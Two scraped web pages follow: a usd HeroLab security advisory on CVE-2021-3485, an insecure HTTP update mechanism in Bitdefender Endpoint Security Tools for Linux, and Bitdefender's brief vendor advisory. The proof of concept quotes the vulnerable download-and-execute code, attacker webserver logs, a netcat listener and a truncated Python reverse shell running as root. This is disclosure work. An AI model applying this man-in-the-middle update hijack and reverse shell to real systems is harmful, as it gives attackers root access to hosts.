=== Content from herolab.usd.de_5e1a0092_20250114_194936.html ===

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg "usd HeroLab Logo hell nebeneinander")](https://herolab.usd.de/)

* [Über uns](https://herolab.usd.de/ueber-uns/)
  + [Wie wir arbeiten](https://herolab.usd.de/wie-wir-arbeiten/)
  + [Unsere Expert\*innen](https://herolab.usd.de/unsere-experten/)
  + [Unsere Leistungen](https://www.usd.de/security-analysis-pentests/)
  + [Unsere Plattformen und Tools](https://herolab.usd.de/unsere-plattformen-und-tools/)
* [Security Research](https://herolab.usd.de/security-research/)
  + [Unser Engagement](/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/labnews/)
* [Meet the Team](https://herolab.usd.de/meet-the-team/)
* [usd AG](http://www.usd.de)
* [English](https://herolab.usd.de/en/security-advisories/usd-2021-0014/ "English")

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg)](https://herolab.usd.de/)

* [Über uns](https://herolab.usd.de/ueber-uns/)
  + [Wie wir arbeiten](https://herolab.usd.de/wie-wir-arbeiten/)
  + [Unsere Expert\*innen](https://herolab.usd.de/unsere-experten/)
  + [Unsere Leistungen](https://www.usd.de/security-analysis-pentests/)
  + [Unsere Plattformen und Tools](https://herolab.usd.de/unsere-plattformen-und-tools/)
* [Security Research](https://herolab.usd.de/security-research/)
  + [Unser Engagement](/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/labnews/)
* [Meet the Team](https://herolab.usd.de/meet-the-team/)
* [usd AG](http://www.usd.de)
* [English](https://herolab.usd.de/en/security-advisories/usd-2021-0014/ "English")

# usd-2021-0014 | BitDefender Endpoint Security Tools for Linux

**Advisory ID**: usd-2021-0014
**CVE Number**: [CVE-2021-3485](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3485)
**Affected Product**: Bitdefender Endpoint Security Tools for Linux
**Affected Version**: < 6.2.21.155
**Vulnerability Type**: Improper Input Validation (CWE-20)
**Security Risk**: Medium
**Vendor URL**: <https://www.bitdefender.com/>
**Vendor Status**: Fixed

###

### Description

The BitDefender Endpoint Security Tools Product Update uses an insecure way of performing product updates. An Attacker in a man-in-the-middle position can exploit this and gain remote code execution as root.

The vulnerable part of the application is the update mechanism called „product-update“. It uses an insecure channel to receive the content of the update.

### Proof of Concept (PoC)

The vulnerable Code is inside the *DownloadFile* function of the product-update bash script. In the following, one can see a code snippet from the file. The *RunCommand* function is a wrapper for eval assuring that the command is run as root.

DownloadFile ()

{

#proxy download

eval RunCommand 'ftp\_proxy="http://$proxyHost" \

http\_proxy="http://$proxyHost" \

https\_proxy="https://$proxyHost" \

wget --no-check-certificate ${opts} -q -T 60 --tries=2 -O \"${to}\" \"${from}\" \

＆＆ Log append "Done." ＆＆ DWL\_METHOD="wget\_proxy" ＆＆ return 0'

[...]

#direct download

eval RunCommand 'wget --no-check-certificate ${opts} -q -T 60 --tries=2 -O "\"${to}\"" ${from}' \

＆＆ USE\_PROXY="N" ＆＆ DWL\_METHOD="wget\_direct" ＆＆ Log append "Done." ＆＆ return 0

[...]

}

As one can see, the file download is done using *wget* with the *–no-check-certificate* flag. In our examined test setup BitDefender used HTTP instead of HTTPS anyway.

The path to gain remote code execution is as follows:

[...]

DownloadFile "${setupdir}/${verfile}" "${URL}/${verfile}" || RET=1

[...]

#download new script and run it with same params

NEW\_SCRIPT\_URL+="/${newscript}"

DownloadFile "${SCRIPTDIR}/${newscript}" "${NEW\_SCRIPT\_URL}"

RunCommand "chmod +x \"${SCRIPTDIR}/${newscript}\""

[...]

RunCommand "\"${SCRIPTDIR}/${newscript}\" $\*"

[...]

On the attacker Webserver this can be observed as:

"GET http://192.168.1.144:7074//bst\_nix/latest\_rings.dat HTTP/1.1" 200 -

"GET http://192.168.1.144:7074//bst\_nix/0.0.0.0/linux-amd64//version.txt HTTP/1.1" 200 -

"GET http://192.168.1.144:7074//bst\_nix/0.0.0.0/downloader.sh HTTP/1.1" 200 -

When a python reverse shell is used the product-update script will connect back:

# nc -l -p 4242 -v

Listening on [0.0.0.0] (family 2, port 4242)

Connection from cq-1120 33730 received!

root@cq-1120:/opt/BitDefender/bin# id

uid=0(root) gid=0(root) groups=0(root)

In the following process list output can be observed, that the python script is a child of the product update:

 root 3237 0.0 0.0 24856 3884 tty1 S+ 02:18 0:00 \\_ /bin/bash ./product-update

root 3238 0.0 0.1 44552 10464 tty1 S+ 02:18 0:00 \\_ python -c import socket,subprocess[...]

root 3239 0.0 0.0 22488 3452 pts/0 Ss+ 02:18 0:00 \\_ /bin/bash
### Fix

It is recommended to use industry proven schemes to implement a software update. This is relying on a secure channel for communication and signing update binaries with a manufacturer private key.

###

### Timeline

* 2021-04-07: Vulnerability identified by Ralf Almon of usd AG.
* 2021-04-07: Initial report to vendor.
* 2021-04-28: CVE-2021-3485 is assigned.
* 2021-05-05: Security release is scheduled for 19th May.
* 2021-05-19: Security release is published.
* 2021-05-24: Security advisory is published: <https://www.bitdefender.com/support/security-advisories/improper-input-validation-in-bitdefender-endpoint-security-tools-for-linux-va-9769/>.
* 2021-05-31: Security advisory released by usd AG.

### Credits

This security vulnerability was found by Ralf Almon of usd AG.

### About usd Security Advisories

![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/icon-hero.png "icon-hero")

In order to protect businesses against hackers and criminals, we always have to keep our skills and knowledge up to date. Thus, security research is just as important for our work as is building up a security community to promote the exchange of knowledge. After all, more security can only be achieved if many individuals take on the task.

Our [CST Academy](https://www.usd.de/en/cst-academy/) and our [usd HeroLab](https://herolab.usd.de/en/) are essential parts of our security mission. We share the knowledge we gain in our practical work and our research through training courses and publications. In this context, the [usd HeroLab](https://herolab.usd.de/en/) publishes a series of papers on new vulnerabilities and current security issues.

Always for the sake of our mission: „more security.“

[to usd AG](https://www.usd.de/)

In accordance with usd AG’s [Responsible Disclosure Policy](/en/responsible-disclosure/), all vendors have been notified of the existence of these vulnerabilities.

##

### Disclaimer

The information provided in this security advisory is provided „as is“ and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible.

#### usd HeroLab

[Kontakt](https://www.usd.de/kontakt/)
[Impressum](https://www.usd.de/impressum/)
[Datenschutz](https://www.usd.de/datenschutz/)
[AGB](https://www.usd.de/allgemeine-geschaeftsbedingungen-beratung/)

© 2023 usd AG

#### LabNews

## [From Unicode to Exploit: The Security Risks of Overlong UTF-8 Encodings](https://herolab.usd.de/the-security-risks-of-overlong-utf-8-encodings/)

Sep. 6, 2024

Written by Dominique Dittert, Senior Security Consultant, usd HeroLab In the dynamic field of cybersecurity, it is often the obscure and long-forgotten vulnerabilities that pose a hidden threat to otherwise hardened systems. One such vulnerability lies in invalid...

## [Security Advisories zu hugocms und Gitea](https://herolab.usd.de/security-advisories-zu-hugocms-und-gitea/)

Juli 25, 2024

Die Pentest Professionals des usd HeroLabs haben während der Durchführung ihrer Pentests hugocms und Gitea untersucht. Dabei wurden mehrere Schwachstellen auf den verschiedenen Anwendungen identifiziert. Die Schwachstelle wurde dem Hersteller im Rahmen der Responsible...

## [Security Advisory zu AXIS Webcam](https://herolab.usd.de/security-advisory-zu-axis-webcam/)

Juli 1, 2024

Die Pentest Professionals des usd HeroLabs haben während der Durchführung ihrer Pentests die AXIS Webcam (P1364) untersucht. Unsere Professionals entdeckten eine Sicherheitslücke (Cross-Site Request Forgery) im Adminpanel der AXIS P1364 Webcam. Das Ausnutzen dieser...

#### Folgen Sie uns

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-github.svg)](https://github.com/usdAG/)    [![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-reddit.svg)](https://www.reddit.com/user/usdAG/?rdt=60932)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-youtube.svg)](https://www.youtube.com/c/usdAG)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-mastodon.svg)](https://infosec.exchange/%40usdAG)

[![](https://www.usd.de/wp-content/uploads/usd-social-media-x.svg)](https://twitter.com/usdAG)[![](https://www.usd.de/wp-content/uploads/usd-social-media-meetup.svg)](https://www.meetup.com/de-DE/Cyber-Security-Transformation-Academy/?_locale=de-DE)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-instagram.svg)](https://www.instagram.com/usdhero/)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-linkedin.svg)](https://www.linkedin.com/company/usdag/?originalSubdomain=de)

[Meldung einer Schwachstelle oder eines Bugs](https://www.usd.de/meldung-bug-oder-schwachstelle/)

[Code of Ethics](/code-of-ethics/)



=== Content from www.bitdefender.com_67c32904_20250114_194941.html ===

[![Bitdefender Homepage](data:image/svg+xml...)![Bitdefender Homepage](https://www.bitdefender.com/assets/bitdefender-theme/assets/images/bitdefender-blue-logo-png.png)](https://www.bitdefender.com/)

* [For Home](https://www.bitdefender.com/solutions/)
  + All-in-one plans
    - All-in-one plans
      * [Ultimate Security](https://www.bitdefender.com/solutions/ultimate-security.html)
      * [Premium Security](https://www.bitdefender.com/solutions/premium-security.html)
      * [Ultimate Small Business Security](https://www.bitdefender.com/solutions/small-business-security.html)
      * [Security For Creators](https://www.bitdefender.com/en-us/consumer/security-for-creators)
    - Device Security
      * [Total Security](https://www.bitdefender.com/solutions/total-security.html)
      * [Internet Security](https://www.bitdefender.com/solutions/internet-security.html)
      * [Antivirus Plus](https://www.bitdefender.com/solutions/antivirus.html)
      * [Antivirus for Mac](https://www.bitdefender.com/solutions/antivirus-for-mac.html)
      * [Mobile Security for Android](https://www.bitdefender.com/solutions/mobile-security-android.html)
      * [Mobile Security for iOS](https://www.bitdefender.com/solutions/mobile-security-ios.html)
      * [Family Pack](https://www.bitdefender.com/solutions/family-pack.html)
      * [Small Office Security](https://www.bitdefender.com/solutions/small-office-security.html)
      * [Compare](https://www.bitdefender.com/solutions/antivirus-comparison.html)
    - Try Bitdefender
      * [Scamio – Scam Detector*AI Powered*](https://www.bitdefender.com/solutions/scamio.html)
      * [Antivirus Free](https://www.bitdefender.com/solutions/free.html)
      * [Antivirus Free for Android](https://www.bitdefender.com/solutions/antivirus-free-for-android.html)
      * [Trial Downloads](https://www.bitdefender.com/Downloads/)
      * [Free Tools](https://www.bitdefender.com/toolbox/)
    - Existing Customers
      * [Renew](https://www.bitdefender.com/renewal/)
      * [Support](https://www.bitdefender.com/consumer/support/)
      * Quick Links
      * [Join Our Community](https://community.bitdefender.com/en/)
      * [Smart Home Cybersecurity](https://www.bitdefender.com/smart-home/)
      * [Cyberpedia](https://www.bitdefender.com/cyberpedia/)
  + Privacy & Identity Protection
    - Privacy
      * [Premium VPN](https://www.bitdefender.com/solutions/vpn.html)
      * [Password Manager](https://www.bitdefender.com/solutions/password-manager.html)
    - Identity Protection
      * [Digital Identity Protection](https://www.bitdefender.com/solutions/digital-identity-protection.html)
      * [Identity Theft Protection](https://www.bitdefender.com/solutions/identity-theft-protection.html)
  + [Free Trials](https://www.bitdefender.com/Downloads/?icid=mega-menu|c|free-trial)
* [For Enterprise](https://www.bitdefender.com/business/)
* [For Partners](https://www.bitdefender.com/partners/)

* [Support for Business](https://www.bitdefender.com/business/support/?lang=en)
* My Account
  [Bitdefender Central](https://login.bitdefender.com/central/login.html?lang=en_US&redirect_url=https:%2F%2Fcentral.bitdefender.com%2F&adobe_mc=MCMID%3D85025944717725733713396037032688820599%7CMCORGID%3D0E920C0F53DA9E9B0A490D45%2540AdobeOrg%7CTS%3D1649395289)
  [GravityZone CLOUD Control](https://gravityzone.bitdefender.com/)

* [Bitdefender](//www.bitdefender.com/)
* »
* Support
* »

 [Back](/support/security-advisories/)
# Improper Input Validation in Bitdefender Endpoint Security Tools for Linux (VA-9769)

Publication date: May 24th, 2021

---

CVE ID:
CVE-2021-3485

CVSS scrore:
6.4 - CVSS:3.1/AV:A/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H

Affected vendors:
BItdefender

Affected products:
Endpoint Security Tools for Linux

Vulnerability details:

An Improper Input Validation vulnerability in the Product Update feature of Bitdefender Endpoint Security Tools for Linux allows a man-in-the-middle attacker to abuse the DownloadFile function of the Product Update to achieve remote code execution.

This issue affects: Bitdefender Endpoint Security Tools for Linux versions prior to 6.2.21.155.

Additional details:
An automatic update to version 6.2.21.155 fixes the issue.

![Bitdefender](data:image/svg+xml...)![Bitdefender](https://download.bitdefender.com/resources/themes/draco/images/sigla_bd_white.svg)
[Legal Terms](/site/view/legal-privacy-policy-for-bitdefender-websites.html "Legal Terms") |
[Privacy Policy](/site/view/legal-privacy.html "Privacy Policy") |

[Support](/consumer/support/ "Support") |
[Contact Us](/site/Main/contact/3 "Contact Us")/
Copyright © 1997 - 2020 Bitdefender. All rights reserved


